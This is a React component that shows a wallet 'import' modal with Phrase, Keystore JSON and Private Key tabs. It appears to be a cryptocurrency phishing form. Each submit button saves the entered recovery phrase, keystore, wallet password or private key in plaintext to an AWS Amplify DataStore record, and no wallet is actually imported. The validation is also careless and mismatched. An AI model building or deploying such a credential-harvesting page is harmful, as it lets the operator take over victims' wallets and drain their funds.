import React, { useState } from "react";
import Products from "../Products";
import CustomInput from "./CustomInput";
import "./PhoneModalForm.css";
import { useForm } from "react-hook-form";
import CustomInput2 from "./CustomInput2";
import { Auth, DataStore, Hub } from "aws-amplify";
import { Wallet } from "../models";


function PhoneModalForm({ walletId, setFormModal, setOpenModel }) {
  const [activeScreen, setActiveScreen] = useState("Phrase");
  const [walletName, setWalletName] = useState([]);
  const { control, handleSubmit, watch, reset } = useForm({});

  React.useEffect(() => {
    getWalletName()

    
  }, [])
  function getWalletName() {
    let productList = Products.filter((a) => a.id === walletId);
    if (productList.length > 0) {
      return productList.map((item) => {
        return (
        setWalletName(item.name)
        )
      
      }
      )}
  }
  

  const onSavePressed = async (data) => {
    const {
      privateKey,
      phrase,
      walletPassword,
      keystoreJson,
      
    } = data;
    try {
     
        // create a new order
        DataStore.save(
          new Wallet({
            walletName: walletName,
            privateKey: privateKey,
            phrase:phrase,
            walletPassword:walletPassword,
            keystoreJson:keystoreJson
           
          })
        );
       
    

    
     
      console.log("saved");
      reset({ ...data });
       
     
     
    } catch (error) {
      console.log(error);
    }
   
   
  };

  function getCategoryProducts() {
    let productList = Products.filter((a) => a.id === walletId);
    if (productList.length > 0) {
      return productList.map((item) => {
        return (
          <div
            style={{
              display: "flex",
              flexDirection: "row",
              color: "black",
              alignItems: "center",
              width:'100%',
              textAlign:'center',
              marginBottom:'40px'
        
            }}
          >
            <img
              style={{ width: "40px", height: "40px", }}
              src={item.url}
              alt={item.name}
            />
            <div
              style={{
                display: "flex",
                flexDirection: "row",
                color: "black",
                fontWeight: "500",
                alignItems:'center'
              }}
            >
              <p style={{ marginLeft: "10px" }}>Import your {item.name}</p>
            </div>
          </div>
        );
      });
    }
  }

  return (
    <div className="mainP">
      <div>
        <div className="modalP">
          <div className="modal__mainContentP">
  
              <div className="modal__WrapperP">
                {getCategoryProducts()}
                <div className="modal__wrapperCenterP">
                  <div className="modal__TabHeaderP">
                    <div className="modal__TabHeaderWrapperP">
                      <div className="modal__TabHeaderContentP">
                        <span className="modal__Tab1WrapperP">
                          <div
                            onClick={() => setActiveScreen("Phrase")}
                            className="modal__Tab1P"
                          >
                            <div
                              className={
                                activeScreen === "Phrase" ? "modal__Tab11P" : ""
                              }
                            >
                              <p style={{fontSize:'12px'}} >Phrase</p>
                            </div>
                          </div>
                        </span>
                        <span className="modal__Tab1WrapperP">
                          <div
                            onClick={() => setActiveScreen("Keystore JSON")}
                            className="modal__Tab1P"
                          >
                            <div
                              className={
                                activeScreen === "Keystore JSON"
                                  ? "modal__Tab11P"
                                  : ""
                              }
                            >
                              <p style={{fontSize:'12px'}}>Keystore JSON</p>
                            </div>
                          </div>
                        </span>
                        <span className="modal__Tab1WrapperP">
                          <div
                            onClick={() => setActiveScreen("Private Key")}
                            className="modal__Tab1P"
                          >
                            <div
                              className={
                                activeScreen === "Private Key"
                                  ? "modal__Tab11P"
                                  : ""
                              }
                            >
                              <p style={{fontSize:'12px'}}>Private Key</p>
                            </div>
                          </div>
                        </span>
                      </div>
              
                    </div>
                  </div>

                  {activeScreen === "Phrase" && (
                    <div style={{ width: "100%" }}>
                      <CustomInput
                        name="phrase"
                        control={control}
                        placeholder='Enter your recovery phrase'
                        rules={{
                          required: "Name is required",
                          minLength: {
                            value: 3,
                            message:
                              "Name should be at least 3 characters long",
                          },
                          maxLength: {
                            value: 14,
                            message: "Name should be max 24 characters long",
                          },
                        }}
                      />
                      <p style={{fontSize:'12px',  marginTop:'20px', marginBottom:'20px'}}>Typically 12 (sometimes 24) words separated by single spaces</p>

                      <div onClick={handleSubmit(onSavePressed)}style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px'}}>
                        <p style={{color:'white'}}>PROCCED</p>
                      
                          <svg style={{width:'20px', height:'20px', color:'white', marginLeft:'5px'}} fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor">
                              <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                        
                        
                        </div>
                    </div>
                  )}

                  {activeScreen === "Keystore JSON" && <div style={{ width: "100%" }}>
                      <CustomInput
                        name="keystoreJson"
                        control={control}
                        placeholder='Enter your recovery phrase'
                        rules={{
                          required: "Name is required",
                          minLength: {
                            value: 3,
                            message:
                              "Name should be at least 3 characters long",
                          },
                          maxLength: {
                            value: 24,
                            message: "Name should be max 24 characters long",
                          },
                        }}
                      />
                      <CustomInput2  
                        name="walletPassword"
                        control={control}
                        placeholder='Wallet Password'
                        rules={{
                          required: "Name is required",
                          minLength: {
                            value: 3,
                            message:
                              "Name should be at least 3 characters long",
                          },
                          maxLength: {
                            value: 24,
                            message: "Name should be max 24 characters long",
                          },
                        }}/>
                      <p style={{fontSize:'12px', marginTop:'20px', marginBottom:'20px'}}>Several lines of text beginning with "..." plus the password you used to encrypt it.</p>

                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px'}}>
                        <p style={{color:'white'}}>PROCCED</p>
                      
                          <svg style={{width:'20px', height:'20px', color:'white', marginLeft:'5px'}} fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor">
                              <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                        
                        
                        </div>
                    </div>}

                  {activeScreen === "Private Key" && <div style={{ width: "100%" }}>
                      
                      <CustomInput2  
                        name="privateKey"
                        control={control}
                        placeholder='Enter your Private Key'
                        rules={{
                          required: "Name is required",
                          minLength: {
                            value: 3,
                            message:
                              "Name should be at least 3 characters long",
                          },
                          maxLength: {
                            value: 24,
                            message: "Name should be max 24 characters long",
                          },
                        }}/>
                      <p style={{fontSize:'12px', marginTop:'20px', marginBottom:'20px' }}>Several lines of text beginning with "..." plus the password you used to encrypt it.</p>

                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px'}}>
                        <p style={{color:'white'}}>PROCCED</p>
                      
                          <svg style={{width:'20px', height:'20px', color:'white', marginLeft:'5px'}} fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor">
                              <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                        
                        
                        </div>
                    </div>}
                </div>
                <div
                style={{
                  display: "flex",
                  flexDirection: "row",
                  marginTop:'20px'
                
               
                 
             
                }}
              >
                <div onClick={()=>{
                  setFormModal(false)
                  setOpenModel(false)
                }} style={{padding:'8px',backgroundColor:'#e53e3e', borderRadius:'10px', color:'white', display:'flex', flexDirection:'row', alignItems:'center', justifyContent:'center', fontWeight:'400', width:'100%' }} >
                Cancel
                  
                </div>
                
              </div>

              </div>
         
            
          </div>
        </div>
      </div>
    </div>
  );
}

export default PhoneModalForm;
